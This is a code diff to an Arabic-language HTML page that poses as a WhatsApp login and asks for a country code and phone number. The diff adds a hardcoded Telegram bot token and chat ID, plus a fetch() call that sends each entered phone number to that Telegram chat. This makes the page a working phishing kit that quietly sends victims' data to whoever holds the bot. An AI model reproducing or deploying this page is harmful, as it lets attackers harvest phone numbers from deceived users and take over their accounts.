@@ -16,7 +16,6 @@
             min-height: 100vh;
         }
 
-        /* شريط التنقل */
         .navbar {
             display: flex;
             justify-content: space-between;
@@ -42,7 +41,6 @@
             font-size: 22px;
         }
 
-        /* الحاوية الرئيسية */
         .container {
             flex: 1;
             text-align: center;
@@ -108,7 +106,6 @@
             background-color: #1DA955;
         }
 
-        /* الشريط السفلي */
         footer {
             background-color: #f1f1f1;
             color: #888;
@@ -126,7 +123,7 @@
 </head>
 
 <body>
-    <!-- شريط التنقل -->
+    <!-- Navbar -->
     <div class="navbar">
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
@@ -135,20 +132,16 @@
         <div class="menu">☰</div>
     </div>
 
-    <!-- الحاوية الرئيسية -->
+    <!-- Main Container -->
     <div class="container">
-        <!-- الشعار -->
         <div class="design">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
         </div>
 
-        <!-- العنوان -->
         <div class="title">تسجيل الدخول</div>
 
-        <!-- الوصف -->
-        <div class="description">الدعوة للانضمام إلى مجموعة واتساب</div>
+        <div class="description">يرجى إدخال رمز الدولة ورقم الهاتف.</div>
 
-        <!-- النموذج -->
         <div class="form-group">
             <select id="countryCode">
                 <option value="966">🇸🇦 السعودية +966</option>
@@ -169,29 +162,50 @@
                 <option value="269">🇰🇲 جزر القمر +269</option>
                 <option value="211">🇸🇸 جنوب السودان +211</option>
             </select>
-            <input id="phoneNumber" type="text" placeholder="رقم الهاتف">
+            <input id="phoneNumber" type="text" placeholder="رقم الهاتف" maxlength="10">
         </div>
         <button onclick="sendMessage()">متابعة</button>
     </div>
 
-    <!-- الشريط السفلي -->
     <footer>
         © 2024 واتساب. جميع الحقوق محفوظة. <br>
         <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">مركز المساعدة</a>
     </footer>
 
     <script>
+        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
+        const chatId = '612575358';
+
         function sendMessage() {
             const countryCode = document.getElementById('countryCode').value;
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
 
-            if (!countryCode || !phoneNumber) {
-                alert('يرجى إدخال رمز الدولة ورقم الهاتف');
+            if (!phoneNumber || phoneNumber.length < 6) {
+                alert('يرجى إدخال رقم هاتف صحيح.');
                 return;
             }
 
             const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;
-            alert(`تم إرسال الرقم: ${fullPhoneNumber}`);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `رقم الهاتف: ${fullPhoneNumber}`
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('تم الإرسال بنجاح!');
+                } else {
+                    alert('حدث خطأ أثناء الإرسال.');
+                }
+            })
+            .catch(error => {
+                alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
+            });
         }
     </script>
 </body>
